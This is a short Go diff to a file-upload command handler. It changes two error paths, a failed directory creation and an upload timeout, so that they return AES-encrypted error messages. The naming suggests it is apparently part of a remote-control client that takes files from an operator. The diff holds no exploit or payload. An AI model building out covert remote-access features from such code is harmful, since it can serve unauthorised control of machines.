@@ -35,7 +35,9 @@ func fileUploadCmd(sendUserId, decData string) {
 	if !fileopt.IsDir(dir) {
 		err = os.Mkdir(dir, 0666)
 		if err != nil {
-			common.SendFailMsg(sendUserId, common.ClientId, "file dir create error", "")
+			data := colorcode.OutputMessage(colorcode.SIGN_ERROR, "file dir create error")
+			outputMsg, _ := crypto.Encrypt([]byte(data), []byte(config.AesKey))
+			common.SendFailMsg(sendUserId, common.ClientId, "fileUpload_ret", outputMsg)
 			debug.DebugPrint(sendUserId + "file dir create error")
 			setchannel.DeleteFileSliceDataChan(sendUserId)
 			return
@@ -53,7 +55,9 @@ func fileUploadCmd(sendUserId, decData string) {
 		case metaData := <-m:
 			pSaveFile.Write(metaData.([]byte))
 		case <-time.After(5 * time.Second):
-			common.SendFailMsg(sendUserId, common.ClientId, "file upload failed", "")
+			data := colorcode.OutputMessage(colorcode.SIGN_ERROR, "file upload failed")
+			outputMsg, _ := crypto.Encrypt([]byte(data), []byte(config.AesKey))
+			common.SendFailMsg(sendUserId, common.ClientId, "fileUpload_ret", outputMsg)
 			debug.DebugPrint(sendUserId + " upload file error")
 			setchannel.DeleteFileSliceDataChan(sendUserId)
 			return
